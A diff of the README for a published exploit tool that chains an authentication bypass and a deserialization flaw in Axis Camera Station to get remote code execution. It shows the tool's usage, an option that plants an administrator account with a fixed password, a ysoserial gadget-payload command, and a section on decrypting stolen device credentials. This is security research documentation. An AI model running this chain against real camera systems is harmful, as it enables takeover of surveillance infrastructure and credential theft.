@@ -4,7 +4,7 @@ This exploit chains CVE‑2025‑30026 (Authentication bypass) with CVE‑2025�
 
 Both vulnerabilities affect Axis Camera Station Pro versions before 6.9 and Axis Camera Station versions before 5.58. 
 
-It is based on Claroty's blog ["Turning Camera Surveillance on its Axis"](https://claroty.com/team82/research/turning-camera-surveillance-on-its-axis), which explains how the protocol and the vulnerabilities work.
+It is based on Claroty's blog post ["Turning Camera Surveillance on its Axis"](https://claroty.com/team82/research/turning-camera-surveillance-on-its-axis), which describes the protocol and the associated vulnerabilities.
 
 
 <br>
@@ -24,7 +24,7 @@ python3 main.py --host <TARGET_IP> --key <CLIENT_PRIVATE_KEY.pem> [OPTIONS]
 | `--key`          | Client RSA-2048 private key in PEM (**required**). |
 | `--json`         | Local JSON file containing the Request to send. |
 | `--version`      | `VersionFacade.get_ProductVersion` Request to get version information. |
-| `--adduser`      | Create user ricardo with password ThisIsIt123 and add it to the Administrators group. |
+| `--adduser`      | Create user `ricardo` with password `ThisIsIt123` and add it to the `Administrators` group. |
 | `--wait`         | Seconds to listen on the channel after the handshake (default `5`). |
 | `--listen`       | Seconds to wait for the response after sending a Request (default `15`). |
 
@@ -40,7 +40,7 @@ python3 main.py --host 192.168.1.197 --port 55752 --key client_priv.pem --versio
 
 ![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/axis_rce/Screenshot_1.jpg)
 
-Exploit the deserialization to create an administrator user "ricardo" with password "ThisIsIt123":
+Exploit the deserialization to create an administrator user `ricardo` with password `ThisIsIt123`:
 
 
 ```bash
@@ -94,7 +94,7 @@ ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping -n 3 10.0.0.4" -o raw
 
 ## Extra loot
 
-Once you have access to the Windows machine, you have access to the `.FDB` databases which contain the credentials to connect to the different devices. These values are encrypted using a weak AES implementation, which you can decrypt in minutes or immediately using the host's volume serial number using this script I created: [acs-decrypt](https://github.com/ricardojoserf/acs_decrypt)
+Once you have access to the Windows machine, you have access to the `.FDB` databases which contain the credentials to connect to the different devices. These are encrypted using a weak AES implementation, which you can decrypt immediately using the host's volume serial number or brute-force it in minutes with a GPU using the script [acs-decrypt](https://github.com/ricardojoserf/acs_decrypt)
 
 
 <br>
